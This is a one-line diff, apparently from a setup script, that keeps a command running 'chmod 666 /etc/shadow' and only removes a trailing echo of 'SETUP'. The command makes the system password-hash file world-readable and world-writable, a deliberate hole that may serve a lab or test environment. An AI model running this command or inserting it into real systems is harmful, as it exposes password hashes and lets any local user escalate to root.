@@ -1,1 +1,1 @@
-chmod 666 /etc/shadow && echo "SETUP"
+chmod 666 /etc/shadow
